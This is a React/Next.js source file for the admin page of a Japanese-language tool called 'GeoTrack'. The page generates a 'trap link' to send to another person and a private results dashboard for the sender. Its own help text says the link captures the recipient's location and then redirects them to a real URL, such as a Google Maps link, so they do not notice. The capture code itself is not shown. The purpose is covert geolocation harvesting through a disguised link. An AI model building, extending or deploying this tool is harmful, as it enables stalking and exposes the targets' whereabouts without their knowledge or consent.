// File: src/app/admin/page.tsx
'use client'

import { useState } from 'react'
import { LinkIcon, MapPinIcon, GlobeAltIcon, ClipboardDocumentCheckIcon, QuestionMarkCircleIcon, CheckIcon } from '@heroicons/react/24/outline'
import Link from 'next/link'

export default function AdminPage() {
    const [targetUrl, setTargetUrl] = useState('')
    const [loading, setLoading] = useState(false)

    const [generatedTrackId, setGeneratedTrackId] = useState<string | null>(null)
    const [copiedLink, setCopiedLink] = useState<'trap' | 'result' | null>(null)

    const handleGenerate = async (e: React.FormEvent) => {
        e.preventDefault()
        setLoading(true)

        try {
            const res = await fetch('/api/links', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ targetUrl })
            })

            const data = await res.json()
            if (res.ok) {
                setGeneratedTrackId(data.trackingId)
                setTargetUrl('') // Clear form
            } else {
                alert(data.error || 'Failed to generate link')
            }
        } catch (err) {
            alert('An error occurred. Please try again.')
        } finally {
            setLoading(false)
        }
    }

    const copyToClipboard = async (text: string, type: 'trap' | 'result') => {
        try {
            await navigator.clipboard.writeText(text)
            setCopiedLink(type)
            setTimeout(() => {
                setCopiedLink(null)
            }, 2000)
        } catch (err) {
            console.error('Failed to copy', err)
        }
    }

    return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
            <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg overflow-hidden border border-gray-100">
                <div className="bg-blue-600 p-6 text-white text-center">
                    <div className="flex justify-end mb-2">
                        <Link href="/help" className="text-blue-200 hover:text-white flex items-center text-sm font-medium transition-colors">
                            <QuestionMarkCircleIcon className="w-5 h-5 mr-1" />
                            使い方・解説
                        </Link>
                    </div>
                    <GlobeAltIcon className="w-12 h-12 mx-auto mb-2 text-blue-200" />
                    <h1 className="text-2xl font-bold tracking-tight">GeoTrack ツール管理画面</h1>
                    <p className="text-blue-200 text-sm mt-1">トラップリンクの生成・管理を行います</p>
                </div>

                <div className="p-8">
                    <form onSubmit={handleGenerate} className="space-y-6">
                        <div>
                            <label htmlFor="url" className="block text-sm font-medium text-gray-700 mb-2">
                                ターゲットURL (本物のURL)
                            </label>
                            <div className="relative">
                                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                    <LinkIcon className="h-5 w-5 text-gray-400" />
                                </div>
                                <input
                                    type="url"
                                    id="url"
                                    required
                                    placeholder="https://maps.app.goo.gl/..."
                                    className="block w-full pl-10 pr-3 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors shadow-sm"
                                    value={targetUrl}
                                    onChange={(e) => setTargetUrl(e.target.value)}
                                />
                            </div>
                            <p className="mt-2 text-xs text-gray-500">
                                位置情報を取得した後に、相手をリダイレクトさせる（飛ばす）本物のURLを入力してください。
                            </p>
                        </div>

                        <button
                            type="submit"
                            disabled={loading}
                            className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-xl shadow-sm text-sm font-semibold text-white transition-all 
                ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700 hover:shadow-lg hover:-translate-y-0.5'}`}
                        >
                            {loading ? (
                                <span className="flex items-center">
                                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    生成中...
                                </span>
                            ) : (
                                'トラップリンクを生成'
                            )}
                        </button>
                    </form>

                    {generatedTrackId && (
                        <div className="mt-8 p-5 bg-blue-50 rounded-xl border border-blue-100 animate-fade-in-up">
                            <h3 className="text-sm font-bold text-blue-900 mb-4 flex items-center">
                                <MapPinIcon className="w-5 h-5 mr-2" />
                                リンクの生成が完了しました！
                            </h3>

                            <div className="space-y-4">
                                {/* Trap Link */}
                                <div>
                                    <label className="block text-xs font-semibold text-blue-800 uppercase tracking-wider mb-1">
                                        トラップリンク （相手に送る用URL）
                                    </label>
                                    <div className="flex items-center">
                                        <input
                                            type="text"
                                            readOnly
                                            className="block w-full text-sm bg-white border border-blue-200 rounded-l-lg py-2 px-3 text-gray-700 outline-none"
                                            value={`${typeof window !== 'undefined' ? window.location.origin : ''}/${generatedTrackId}`}
                                        />
                                        <button
                                            onClick={() => copyToClipboard(`${window.location.origin}/${generatedTrackId}`, 'trap')}
                                            className={`${copiedLink === 'trap' ? 'bg-emerald-600 hover:bg-emerald-700' : 'bg-blue-600 hover:bg-blue-700'} text-white px-3 py-2 rounded-r-lg transition-colors`}
                                            title="Copy Trap Link"
                                        >
                                            {copiedLink === 'trap' ? (
                                                <CheckIcon className="w-5 h-5" />
                                            ) : (
                                                <ClipboardDocumentCheckIcon className="w-5 h-5" />
                                            )}
                                        </button>
                                    </div>
                                </div>

                                {/* Result Link */}
                                <div>
                                    <label className="block text-xs font-semibold text-emerald-800 uppercase tracking-wider mb-1">
                                        結果ダッシュボード （自分が見る用URL）
                                    </label>
                                    <div className="flex items-center">
                                        <input
                                            type="text"
                                            readOnly
                                            className="block w-full text-sm bg-white border border-emerald-200 rounded-l-lg py-2 px-3 text-gray-700 outline-none"
                                            value={`${typeof window !== 'undefined' ? window.location.origin : ''}/result/${generatedTrackId}`}
                                        />
                                        <button
                                            onClick={() => copyToClipboard(`${window.location.origin}/result/${generatedTrackId}`, 'result')}
                                            className={`${copiedLink === 'result' ? 'bg-emerald-600 hover:bg-emerald-700' : 'bg-emerald-600 hover:bg-emerald-700'} text-white px-3 py-2 rounded-r-lg transition-colors`}
                                            title="Copy Result Link"
                                        >
                                            {copiedLink === 'result' ? (
                                                <CheckIcon className="w-5 h-5" />
                                            ) : (
                                                <ClipboardDocumentCheckIcon className="w-5 h-5" />
                                            )}
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        </div>
    )
}
